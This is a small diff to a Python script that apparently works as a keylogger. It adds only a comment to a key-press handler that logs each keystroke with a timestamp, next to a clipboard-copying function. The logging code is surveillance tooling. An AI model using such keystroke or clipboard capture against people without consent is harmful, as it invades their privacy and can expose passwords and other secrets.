@@ -88,6 +88,7 @@ def copy_clipboard():
         log_it(log_entry)
 
 def on_press_function(key_pressed):
+    # A key is pressed
     key = asciify(key_pressed)
     
     log_entry = f"Key pressed:\t{key} at {datetime.now()}\n"
